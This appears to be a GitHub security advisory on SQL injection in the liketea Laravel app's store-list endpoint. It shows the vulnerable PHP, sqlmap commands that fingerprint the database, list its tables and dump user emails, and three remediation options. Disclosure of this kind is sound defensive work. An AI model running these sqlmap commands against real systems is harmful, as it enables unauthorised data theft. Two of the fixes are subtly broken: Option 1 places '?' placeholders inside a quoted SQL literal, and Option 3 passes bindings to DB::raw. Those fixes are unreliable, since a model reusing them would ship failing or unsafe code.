# [liketea](https://github.com/cameasy/liketea) SQL Injection

### SQL Injection in Geolocation Query [CRITICAL]

#### Description

A critical SQL injection vulnerability exists in the store listing API endpoint that allows unauthenticated attackers to execute arbitrary SQL commands. User-supplied latitude and longitude parameters are directly concatenated into a raw SQL query without sanitization or parameterization.

#### Affected Component

- **File**: `laravel/app/Http/Controllers/Front/StoreController.php`
- **Lines**: 42-46, 73-80
- **Endpoint**: `POST /api/v1/front/store/list`
- **Authentication**: Not Required

#### Vulnerable Code

```php
public function list(Request $request)
{
    $lat = $request->input('lat') ?: '31.182021';
    $lng = $request->input('lng') ?: '121.425562';

    $model = Store::where('is_open', 1)
        ->selectRaw("*, ST_Distance(
            ST_GeomFromText('POINT($lng $lat)'),  // ❌ UNSAFE
            ST_GeomFromText(CONCAT('POINT(', stores.lng, ' ', stores.lat, ')'))
        ) as distance")
        ->orderBy('distance', 'asc')
        ->get();
}
```

#### Proof of Concept
<img width="858" height="371" alt="image" src="https://github.com/user-attachments/assets/b2d7d987-6eff-4daf-9ce7-aa213a6c0acc" />

**Get DB Version & Available DBs**
```bash
sqlmap -u "http://localhost:8000/api/v1/front/store/list" \
  --method=POST \
  --data='{"lat":"31.182021","lng":"121.425562"}' \
  --headers="Content-Type: application/json" \
  -p lng \
  --banner \
  --batch
```

<img width="858" height="371" alt="image" src="https://github.com/user-attachments/assets/a20122d0-a444-4c3c-af8d-3e5f4e2a8951" />

**Get All Tables**

```bash
sqlmap -u "http://localhost:8000/api/v1/front/store/list" \
  --method=POST \
  --data='{"lat":"31.182021","lng":"121.425562"}' \
  --headers="Content-Type: application/json" \
  -p lng \
  -D liketea \
  --tables \
  --batch
```

<img width="732" height="371" alt="image" src="https://github.com/user-attachments/assets/3cf3a113-9422-4d25-b9c4-a3c67ef188a7" />

**Get Users**
```bash
sqlmap -u "http://localhost:8000/api/v1/front/store/list" \
  --method=POST \
  --data='{"lat":"31.182021","lng":"121.425562"}' \
  --headers="Content-Type: application/json" \
  -p lng \
  -D liketea \
  -T users \
  -C id,email,type \
  --dump \
  --batch
```

<img width="858" height="371" alt="image" src="https://github.com/user-attachments/assets/3fe2f3a2-6cb9-433f-84c9-27b752d6fa1f" />


#### Remediation

**Option 1: Input Validation (Recommended)**

```php
public function list(Request $request)
{
    // Validate and sanitize inputs
    $lat = floatval($request->input('lat', '31.182021'));
    $lng = floatval($request->input('lng', '121.425562'));

    // Additional bounds checking
    if ($lat < -90 || $lat > 90 || $lng < -180 || $lng > 180) {
        return response()->json(['error' => 'Invalid coordinates'], 400);
    }

    $model = Store::where('is_open', 1)
        ->selectRaw("*, ST_Distance(
            ST_GeomFromText('POINT(? ?)'),
            ST_GeomFromText(CONCAT('POINT(', stores.lng, ' ', stores.lat, ')'))
        ) as distance", [$lng, $lat])
        ->orderBy('distance', 'asc')
        ->get();
}
```

**Option 2: Query Builder (Best)**

```php
public function list(Request $request)
{
    $validated = $request->validate([
        'lat' => ['required', 'numeric', 'between:-90,90'],
        'lng' => ['required', 'numeric', 'between:-180,180'],
    ]);

    $lat = $validated['lat'];
    $lng = $validated['lng'];

    $model = Store::where('is_open', 1)
        ->selectRaw("*, ST_Distance(
            POINT(?, ?),
            POINT(stores.lng, stores.lat)
        ) as distance", [$lng, $lat])
        ->orderBy('distance', 'asc')
        ->get();
}
```

**Option 3: Abstraction Layer (DRY Principle)**

```php
// app/Services/GeoQueryService.php
class GeoQueryService
{
    public static function calculateDistance(float $lat, float $lng)
    {
        return DB::raw("
            ST_Distance(
                POINT(?, ?),
                POINT(stores.lng, stores.lat)
            )
        ", [$lng, $lat]);
    }
}

// Controller
public function list(Request $request)
{
    $validated = $request->validate([
        'lat' => ['required', 'numeric', 'between:-90,90'],
        'lng' => ['required', 'numeric', 'between:-180,180'],
    ]);

    $model = Store::where('is_open', 1)
        ->select('*')
        ->selectSub(
            GeoQueryService::calculateDistance($validated['lat'], $validated['lng']),
            'distance'
        )
        ->orderBy('distance', 'asc')
        ->get();
}
```
